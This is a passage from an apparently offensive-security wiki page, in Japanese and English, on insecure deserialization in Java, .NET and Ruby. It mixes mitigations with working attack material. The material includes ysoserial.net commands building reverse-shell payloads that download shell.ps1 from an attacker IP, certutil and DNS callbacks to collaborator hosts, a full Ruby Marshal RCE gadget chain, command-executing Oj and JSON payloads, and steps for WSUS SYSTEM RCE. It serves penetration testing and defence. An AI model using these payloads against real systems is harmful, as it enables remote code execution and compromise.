クラス階層の都合で特定の **オブジェクトが`Serializable`を実装しなければならない** 場合、意図しないデシリアライズのリスクがあります。これを防ぐために、これらのオブジェクトをデシリアライズ不可能にするには、常に例外を投げる `final` な `readObject()` メソッドを定義してください。以下のように:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Java における Deserialization セキュリティの強化**

**`java.io.ObjectInputStream` のカスタマイズ** は deserialization プロセスを保護する実用的なアプローチです。 この手法は次の場合に適しています:

- deserialization コードがあなたの管理下にある場合。
- deserialization に期待されるクラスが既知である場合。

**`resolveClass()`** メソッドをオーバーライドして deserialization を許可されたクラスのみに制限します。これにより明示的に許可されたクラス以外の deserialization を防止できます。例えば以下の例では deserialization を `Bicycle` クラスのみに制限しています:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Using a Java Agent for Security Enhancement** は、コードの修正が不可能な場合のフォールバックソリューションを提供します。この方法は主に **悪意のあるクラスのブラックリスト化** に適用され、JVM パラメータを使用します:
```
-javaagent:name-of-agent.jar
```
それは、deserializationを動的に保護する方法を提供し、即時のコード変更が実用的でない環境に最適です。

例は [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0) を参照してください

**Implementing Serialization Filters**: Java 9は**`ObjectInputFilter`**インターフェースを通じてserialization filtersを導入しました。これにより、シリアライズされたオブジェクトがdeserializedされる前に満たすべき条件を指定する強力な仕組みが提供されます。これらのfiltersはグローバルまたはストリーム単位で適用でき、deserializationプロセスに対して細かな制御を提供します。

serialization filtersを利用するには、すべてのdeserialization操作に適用されるグローバルフィルタを設定するか、特定のストリームに対して動的に構成できます。例えば:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**外部ライブラリを活用したセキュリティ強化**: Libraries such as **NotSoSerial**, **jdeserialize**, and **Kryo** offer advanced features for controlling and monitoring Java deserialization. These libraries can provide additional layers of security, such as whitelisting or blacklisting classes, analyzing serialized objects before deserialization, and implementing custom serialization strategies.

- **NotSoSerial** はデシリアライズ処理をインターセプトして、非信頼コードの実行を防ぎます。
- **jdeserialize** はオブジェクトをデシリアライズせずにシリアライズされた Java オブジェクトを解析でき、潜在的に悪意のある内容の特定に役立ちます。
- **Kryo** は速度と効率を重視した代替のシリアライズフレームワークで、セキュリティ強化に役立つ設定可能なシリアライズ戦略を提供します。

### References

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Find whats is **JNDI Injection, how to abuse it via RMI, CORBA & LDAP and how to exploit log4shell** (and example of this vuln) in the following page:


{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Message Service

> The **Java Message Service** (**JMS**) API is a Java message-oriented middleware API for sending messages between two or more clients. It is an implementation to handle the producer–consumer problem. JMS is a part of the Java Platform, Enterprise Edition (Java EE), and was defined by a specification developed at Sun Microsystems, but which has since been guided by the Java Community Process. It is a messaging standard that allows application components based on Java EE to create, send, receive, and read messages. It allows the communication between different components of a distributed application to be loosely coupled, reliable, and asynchronous. (From [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### 製品

There are several products using this middleware to send messages:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### 悪用

つまり、JMS を危険な方法で使用しているサービスが多数存在します。したがって、通常は有効な資格情報が必要ですが、そのサービスにメッセージを送信するための十分な権限があれば、消費者／サブスクライバー側でデシリアライズされる悪意のあるシリアライズオブジェクトを送信できる可能性があります。\
これは、この攻撃ではそのメッセージを使用するすべてのクライアントが感染することを意味します。

サービスが脆弱であっても（ユーザー入力を安全でない方法でデシリアライズしているため）脆弱性を悪用するには有効な gadgets を見つける必要があることを忘れないでください。

ツール [JMET](https://github.com/matthiaskaiser/jmet) は、既知の gadgets を使用してシリアライズされた複数の悪意あるオブジェクトを送信し、これらのサービスに接続して攻撃するために作成されました。これらのエクスプロイトは、サービスがまだ脆弱であり、使用される gadgets のいずれかが脆弱なアプリケーション内に存在する場合に動作します。

### References

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

In the context of .Net, deserialization exploits operate in a manner akin to those found in Java, where gadgets are exploited to run specific code during the deserialization of an object.

### Fingerprint

#### WhiteBox

The source code should be inspected for occurrences of:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

The focus should be on serializers that permit the type to be determined by a variable under user control.

#### BlackBox

The search should target the Base64 encoded string **AAEAAAD/////** or any similar pattern that might undergo deserialization on the server-side, granting control over the type to be deserialized. This could include, but is not limited to, **JSON** or **XML** structures featuring `TypeObject` or `$type`.

### ysoserial.net

In this case you can use the tool [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) in order to **create the deserialization exploits**. Once downloaded the git repository you should **compile the tool** using Visual Studio for example.

If you want to learn about **how does ysoserial.net creates it's exploit** you can [**check this page where is explained the ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

The main options of **ysoserial.net** are: **`--gadget`**, **`--formatter`**, **`--output`** and **`--plugin`.**

- **`--gadget`** used to indicate the gadget to abuse (indicate the class/function that will be abused during deserialization to execute commands).
- **`--formatter`**, used to indicated the method to serialized the exploit (you need to know which library is using the back-end to deserialize the payload and use the same to serialize it)
- **`--output`** used to indicate if you want the exploit in **raw** or **base64** encoded. _Note that **ysoserial.net** will **encode** the payload using **UTF-16LE** (encoding used by default on Windows) so if you get the raw and just encode it from a linux console you might have some **encoding compatibility problems** that will prevent the exploit from working properly (in HTB JSON box the payload worked in both UTF-16LE and ASCII but this doesn't mean it will always work)._
- **`--plugin`** ysoserial.net supports plugins to craft **exploits for specific frameworks** like ViewState

#### More ysoserial.net parameters

- `--minify` will provide a **smaller payload** (if possible)
- `--raf -f Json.Net -c "anything"` This will indicate all the gadgets that can be used with a provided formatter (`Json.Net` in this case)
- `--sf xml` you can **indicate a gadget** (`-g`)and ysoserial.net will search for formatters containing "xml" (case insensitive)

**ysoserial examples** to create exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** には、各 exploit がどのように動作するかをよりよく理解するのに役立つ **非常に興味深いパラメータ** があります: `--test`\
このパラメータを指定すると、**ysoserial.net** は **試行** を行い **exploit をローカルで,** 実行するので、payload が正しく動作するかをテストできます.\
This parameter is helpful because if you review the code you will find chucks of code like the following one (from [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
これは、exploit をテストするためにコードが [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) を呼び出すことを意味します。
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
前のコードは **作成されたエクスプロイトに対して脆弱です**。したがって、.Net アプリケーションで同様のものを見つけた場合、そのアプリケーションもおそらく脆弱であることを意味します。\
そのため、**`--test`** パラメータは、**ysoserial.net** が作成できる desrialization exploit に対して、**どのコードのチャンクが脆弱であるか**を理解することを可能にします。

### ViewState

[この投稿について参照してください: this POST about **how to try to exploit the \_\_ViewState parameter of .Net** ](exploiting-__viewstate-parameter.md)で**任意のコードを実行する**方法を確認してください。もし被害者マシンで使用される秘密を**すでに知っている**場合は、[**read this post to know to execute code**](exploiting-__viewstate-knowing-the-secret.md)をお読みください。

### Real‑world sink: WSUS AuthorizationCookie & Reporting SOAP → BinaryFormatter/SoapFormatter RCE

- 影響を受けるエンドポイント:
- `/SimpleAuthWebService/SimpleAuth.asmx` → GetCookie() AuthorizationCookie decrypted then deserialized with BinaryFormatter.
- `/ReportingWebService.asmx` → ReportEventBatch and related SOAP ops that reach SoapFormatter sinks; base64 gadget is processed when the WSUS console ingests the event.
- 根本原因: attacker‑controlled bytes reach legacy .NET formatters (BinaryFormatter/SoapFormatter) without strict allow‑lists/binders, so gadget chains execute as the WSUS service account (often SYSTEM).

Minimal exploitation (Reporting path):
1) Generate a .NET gadget with ysoserial.net (BinaryFormatter or SoapFormatter) and output base64, for example:
```powershell
# Reverse shell (EncodedCommand) via BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <BASE64_PS>"

# Simple calc via SoapFormatter (test)
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "calc.exe"
```
2) `ReportEventBatch` 用の SOAP を作成し、base64 gadget を埋め込み `/ReportingWebService.asmx` に POST する。  
3) 管理者が WSUS コンソールを開くと、イベントが deserialized され、gadget が発動する（RCE as SYSTEM）。

AuthorizationCookie / GetCookie()
- 偽造された AuthorizationCookie が受け入れられ、復号され、BinaryFormatter sink に渡されることで、到達可能な場合は pre‑auth RCE を引き起こせる。

Public PoC (tecxx/CVE-2025-59287-WSUS) のパラメータ：
```powershell
$lhost = "192.168.49.51"
$lport = 53
$targetURL = "http://192.168.51.89:8530"
```
See [Windows Local Privilege Escalation – WSUS](../../windows-hardening/windows-local-privilege-escalation/README.md)

### 対策

.Net における deserialization に関連するリスクを軽減するために:

- **データストリームがオブジェクト型を定義することを許可しない。** 可能な場合は `DataContractSerializer` または `XmlSerializer` を使用する。
- **`JSON.Net` を使用する場合は `TypeNameHandling` を `None` に設定する:** `TypeNameHandling = TypeNameHandling.None`
- **`JavaScriptSerializer` を `JavaScriptTypeResolver` と共に使用するのは避ける。**
- **deserialized 可能な型を制限する。** .Net 型には `System.IO.FileInfo` のようにサーバ上のファイルのプロパティを変更でき、場合によっては denial of service attacks を引き起こす可能性があるなどの固有のリスクがあることを理解する。
- **危険なプロパティを持つ型には注意する。** 例: `System.ComponentModel.DataAnnotations.ValidationException` の `Value` プロパティは悪用され得る。
- **型のインスタンス化を安全に制御する。** 攻撃者が deserialization プロセスに影響を与えるのを防ぐ。そうしないと `DataContractSerializer` や `XmlSerializer` ですら脆弱になり得る。
- **ホワイトリスト制御を実装する。** `BinaryFormatter` と `JSON.Net` 用にカスタム `SerializationBinder` を使用する。
- **.Net 内の既知の insecure deserialization gadgets を把握し、デシアライザがそれらの型をインスタンス化しないようにする。**
- **潜在的にリスクのあるコードを分離する。** 既知の gadgets（例: WPF アプリケーションの `System.Windows.Data.ObjectDataProvider`）がインターネットアクセスを持つコードや信頼できないデータソースにさらされないようにする。

### **参考資料**

- Java と .Net の JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**、**講演: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) 、スライド: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Ruby では、シリアライズは **marshal** ライブラリ内の 2 つのメソッドによって行われる。最初のメソッドである **dump** はオブジェクトをバイトストリームに変換するために使用される。このプロセスは serialization と呼ばれる。逆に、2 番目のメソッドである **load** はバイトストリームをオブジェクトに戻すために使用され、これは deserialization と呼ばれる。

シリアライズされたオブジェクトを保護するために、**Ruby は HMAC (Hash-Based Message Authentication Code) を使用し、データの整合性と真正性を保証する。** この目的で使用されるキーは以下のいずれかの場所に格納されていることがある:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generic deserialization to RCE gadget chain (詳細は [https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/) を参照):**
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Ruby On Railsを悪用する別のRCEチェーン: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() method

（[**this vulnerability report**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/)で説明されているように）、ユーザーの未サニタイズ入力がrubyオブジェクトの`.send()`メソッドに到達すると、このメソッドはオブジェクトの**任意の他のメソッドを呼び出す**ことを任意のパラメータで可能にします。

例えば、evalを呼び出し2番目のパラメータにruby codeを渡すと、任意のコードを実行できます:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
さらに、もし攻撃者によって**`.send()`**のパラメータが1つだけ制御されている場合（前の writeup で述べた通り）、引数を**必要としない**、または引数に**デフォルト値**が設定されているオブジェクトの任意のメソッドを呼び出すことが可能です。\\
このために、オブジェクトのすべてのメソッドを列挙して、**これらの要件を満たす興味深いメソッドを見つける**ことができます。
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby クラス汚染

[Check how it could be possible to [pollute a Ruby class and abuse it in here](ruby-class-pollution.md).]

### Ruby _json 汚染

ボディに配列のようにハッシュ化できない値を送信すると、それらは `_json` という新しいキーに追加されます。  
しかし、攻撃者はボディ内に任意の値を持つ `_json` という値を設定することも可能です。例えばバックエンドがあるパラメータの正当性をチェックした後に `_json` パラメータを使って何らかの処理を行う場合、認可バイパスが発生する可能性があります。

Check more information in the [Ruby _json pollution page](ruby-_json-pollution.md).

### その他のライブラリ

This technique was taken[ **from this blog post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

オブジェクトをシリアライズするために使用される他の Ruby ライブラリも存在し、不適切なデシリアライズ時にこれらが悪用されて RCE を得られる可能性があります。以下の表は、これらのライブラリのいくつかと、アンシリアライズ時にロードされたクラス内で呼び出されるメソッド（基本的に RCE を引き起こすために悪用する関数）を示しています：

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>ライブラリ</strong></td><td><strong>入力データ</strong></td><td><strong>クラス内でトリガーされるメソッド</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (クラスは hash(map) のキーとして配置する必要がある)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (クラスは hash(map) のキーとして配置する必要がある)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (クラスは hash(map) のキーとして配置する必要がある)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([see notes regarding json_create at end](#table-vulnerable-sinks))</td></tr></tbody></table>

基本例:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
Ojを悪用しようとした場合、gadget classを見つけられ、その内部の`hash`関数が`to_s`を呼び出し、さらにspecがfetch_pathを呼び出して任意のURLを取得させることができたため、この種のunsanitized deserialization vulnerabilitiesの検出に非常に有効だった。
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
さらに、前の手法ではシステム上にフォルダが作成されることも確認されており、これは別の gadget を悪用してこれを完全な RCE に変えるための前提条件になっている。例えば:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Check for more details in the [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

### Bootstrap Caching

Not really a desearilization vuln but a nice trick to abuse bootstrap caching to to get RCE from a rails application with an arbitrary file write (find the complete [original post in here](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/)).

Below is a short summary of the steps detailed in the article for exploiting an arbitrary file write vulnerability by abusing Bootsnap caching:

- Identify the Vulnerability and Environment

Rails アプリのファイルアップロード機能により、攻撃者が任意にファイルを書き込める。アプリは制限された環境（Docker の非-root ユーザーにより tmp のような特定ディレクトリのみ書き込み可能）で動作しているが、それでも Bootsnap のキャッシュディレクトリ（通常 tmp/cache/bootsnap 以下）への書き込みが可能である。

- Understand Bootsnap’s Cache Mechanism

Bootsnap はコンパイル済みの Ruby コード、YAML、JSON ファイルをキャッシュすることで Rails の起動時間を短縮する。キャッシュファイルはキャッシュキーのヘッダ（Ruby version、file size、mtime、compile options などのフィールドを含む）と、その後に続くコンパイル済みコードを含む形で保存される。このヘッダはアプリ起動時にキャッシュを検証するために使用される。

- Gather File Metadata

攻撃者はまず、Rails 起動時にロードされそうなターゲットファイル（例: set.rb）を選択する。コンテナ内で Ruby コードを実行して、RUBY_VERSION、RUBY_REVISION、size、mtime、compile_option といった重要なメタデータを抽出する。これらは有効なキャッシュキーを作成するために必要である。

- Compute the Cache File Path

Bootsnap の FNV-1a 64-bit ハッシュ機構を再現することで、正しいキャッシュファイルパスを特定する。この手順により、悪意あるキャッシュファイルが Bootsnap が期待する場所（例: tmp/cache/bootsnap/compile-cache-iseq/）に正確に配置されることが保証される。

- Craft the Malicious Cache File

攻撃者は以下を行うペイロードを用意する:

- 任意のコマンドを実行（例: プロセス情報を表示するための id 実行）。
- 再帰的な悪用を防ぐため、実行後に悪意あるキャッシュを削除する。
- アプリケーションがクラッシュしないよう元のファイル（例: set.rb）をロードする。

このペイロードはバイナリの Ruby コードにコンパイルされ、前述のメタデータと Bootsnap の正しいバージョン番号を用いて慎重に構築したキャッシュキーのヘッダと連結される。

- Overwrite and Trigger Execution

arbitrary file write 脆弱性を利用して、攻撃者は作成したキャッシュファイルを算出した場所に書き込む。続いてサーバ再起動をトリガーする（Puma が監視する tmp/restart.txt に書き込むなど）。再起動時に Rails がターゲットファイルを require すると、悪意あるキャッシュファイルが読み込まれ、結果として RCE が発生する。

### Ruby Marshal exploitation in practice (updated)

Treat any path where untrusted bytes reach `Marshal.load`/`marshal_load` as an RCE sink. Marshal は任意のオブジェクトグラフを再構築し、マテリアライズ時にライブラリや gem のコールバックをトリガーする。

- Minimal vulnerable Rails code path:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- 実際のチェーンで見られる一般的な gadget クラス: `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- ペイロードに埋め込まれる典型的な副作用マーカー（unmarshal 中に実行される）:
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
実際のアプリでの出現場所:
- Railsのcache storeやsession store（歴史的にMarshalを使用）
- バックグラウンドジョブのバックエンドやファイルバックのオブジェクトストア
- バイナリオブジェクトblobのカスタムな永続化や転送

ガジェット発見の効率化:
- constructors、`hash`、`_load`、`init_with`、またはunmarshal中に呼び出される副作用のあるメソッドをgrepする
- CodeQLのRuby unsafe deserializationクエリを使い、sources → sinksを追跡してgadgetsを抽出する
- 公開されたマルチフォーマットPoC（JSON/XML/YAML/Marshal）で検証する


## 参考文献

- Trail of Bits – Marshal madness: A brief history of Ruby deserialization exploits: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4 Marshal chain: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 insecure deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Discovering gadget chains in Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby unsafe deserialization (query help): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 universal chain: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 release: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby fix PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Auditing RubyGems.org (Marshal findings): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/
- watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035: https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/
- [OffSec – CVE-2025-59287 WSUS unsafe deserialization (blog)](https://www.offsec.com/blog/recent-vulnerabilities-in-redis-servers-lua-scripting-engine-2/)
- [PoC – tecxx/CVE-2025-59287-WSUS](https://github.com/tecxx/CVE-2025-59287-WSUS)

{{#include ../../banners/hacktricks-training.md}}
